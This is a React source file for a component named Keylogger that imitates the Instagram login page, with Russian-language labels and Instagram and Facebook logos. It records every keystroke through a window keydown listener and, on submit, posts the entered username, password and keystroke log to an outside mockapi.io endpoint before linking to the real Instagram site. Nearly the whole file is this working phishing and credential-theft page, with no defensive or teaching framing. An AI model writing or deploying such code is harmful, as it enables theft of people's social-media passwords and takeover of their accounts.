import { TextField } from '@mui/material';
import React, { useEffect, useState, useCallback } from 'react';

import insta from "./Appimg/img/instalogo.png";
import face from "./Appimg/img/facebooc.png";
import image from "./Appimg/img/image.png";
import screen from "./Appimg/img/screen.png";

const Keylogger = () => {
  const [loggedKeys, setLoggedKeys] = useState([]);
  const [userName, setUserName] = useState('');
  const [password, setPassword] = useState('');

  const handleKeyDown = useCallback(
    (event) => {
      const keys = JSON.parse(localStorage.getItem('loggedKeys')) || [];
      keys.push(event.key);
      localStorage.setItem('loggedKeys', JSON.stringify(keys));
      setLoggedKeys(keys);
    },
    [setLoggedKeys]
  );

  useEffect(() => {
    window.addEventListener('keydown', handleKeyDown);

    return () => {
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, [handleKeyDown]);

  const url = 'https://670e426a073307b4ee461c17.mockapi.io/logger';

  const handleSubmit = (e) => {
    e.preventDefault();

    // Отправка POST-запроса на сервер
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        userName,
        password,
        loggedKeys,
      }),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        // Можно добавить логику при успешной отправке
      })
      .catch((error) => {
        console.error('Error:', error);
      });
  };

  return (
    <div>
      <div className="flex flex-wrap justify-center items-center ">
        <div className="flex justify-center w-[1200px] gap-9 mt-10 lg:ml-[100px]">
          <div className='w-[400px] h-[450px] shadow-2xl flex flex-wrap items-center justify-center rounded-3xl'>
            <form onSubmit={handleSubmit} className='flex flex-wrap justify-around items-center w-[300px] gap-10'>
              <img src={insta} className="w-[150px] h-auto " alt="Instagram logo" />

              <TextField
                sx={{
                  height: '20px',
                  ".MuiInputBase-input": {
                    height: '10px',
                    width: '300px',
                    border: '1px solid',
                  }
                }}
                id="filled-basic"
                label="Телефон имя пользователя или эл адрес"
                variant="filled"
                name="userName"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
              />

              <TextField
                sx={{
                  height: '20px',
                  ".MuiInputBase-input": {
                    height: '10px',
                    width: '300px',
                    border: '1px solid',
                  }
                }}
                id="filled-basic"
                label="Пароль"
                variant="filled"
                name="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />

            <a href="https://www.instagram.com/">
            <button className='cursor-pointer w-[300px] mt-[5px] h-[35px] bg-sky-500 text-white text-[20px] rounded-lg' type='submit'>
                Войти
              </button>
            </a>

              <div className="flex w-[100%] justify-between gap-5 items-center">
                <div className="w-[150px] border-[gray] border-[1px]"></div>
                <h1 className="cursor-pointer">ИЛИ</h1>
                <div className="w-[150px] border-[gray] border-[1px]"></div>
              </div>

              <div className="flex items-center justify-around gap-3 mt-[-30px] cursor-pointer">
                <img src={face} alt="Facebook logo" />
                <h1 className="text-slate-700 font-[600]">Войти через Facebook</h1>
              </div>

              <p className="mt-[-20px]">Забыли пароль?</p>
            </form>

            <div className="w-[400px] mt-[50px] h-[80px] border-[black] border-[1px] flex flex-wrap justify-center items-center text-[17px] font-[600] text-sky-500 bg-white cursor-pointer">
              <li to={"/registration"}>Создать новый аккаунт</li>
            </div>
            <h1 className="mt-[10px]">Установите приложение</h1>
            <div className="flex flex-wrap justify-center items-center mt-[20px]">
              <img src={image} className="w-[200px]" alt="Download app" />
              <img src={screen} className="w-[170px]" alt="App screen" />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Keylogger;
